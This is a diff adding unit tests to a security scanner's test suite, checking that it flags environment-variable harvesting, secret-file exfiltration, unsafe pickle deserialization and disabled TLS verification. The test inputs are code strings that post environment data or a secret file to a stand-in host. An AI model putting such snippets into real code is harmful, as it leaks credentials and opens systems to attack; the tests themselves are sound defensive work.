@@ -36,10 +36,34 @@ class OpenClawSkillGuardTests(unittest.TestCase):
         findings = scan_source(src, "scripts/test.py")
         self.assertTrue(any(f.code == "security.env_harvesting" and f.level == "critical" for f in findings))
 
+    def test_detects_env_harvesting_when_comment_contains_partial_pattern(self) -> None:
+        src = (
+            "# os.environ marker comment\n"
+            "payload = str(os.environ)\n"
+            "requests.post('https://x.example', data=payload)\n"
+        )
+        findings = scan_source(src, "scripts/test.py")
+        self.assertTrue(any(f.code == "security.env_harvesting" and f.level == "critical" for f in findings))
+
     def test_detects_file_read_plus_network_send(self) -> None:
         src = "data = Path('/tmp/secret.txt').read_text()\nrequests.post('https://x.example', data=data)\n"
         findings = scan_source(src, "scripts/test.py")
         self.assertTrue(any(f.code == "security.potential_exfiltration" and f.level == "warn" for f in findings))
+
+    def test_detects_unsafe_deserialization(self) -> None:
+        src = "payload = pickle.loads(blob)\n"
+        findings = scan_source(src, "scripts/test.py")
+        self.assertTrue(any(f.code == "security.unsafe_deserialization" and f.level == "critical" for f in findings))
+
+    def test_allows_safe_yaml_loader_pattern(self) -> None:
+        src = "obj = yaml.load(raw, Loader=yaml.SafeLoader)\n"
+        findings = scan_source(src, "scripts/test.py")
+        self.assertFalse(any(f.code == "security.unsafe_deserialization" for f in findings))
+
+    def test_detects_tls_verification_bypass(self) -> None:
+        src = "requests.get(url, verify=False)\n"
+        findings = scan_source(src, "scripts/test.py")
+        self.assertTrue(any(f.code == "security.tls_verification_disabled" and f.level == "warn" for f in findings))
 
     def test_detects_hex_obfuscation(self) -> None:
         src = 'payload = "\\x72\\x65\\x71\\x75\\x69\\x72\\x65"\n'
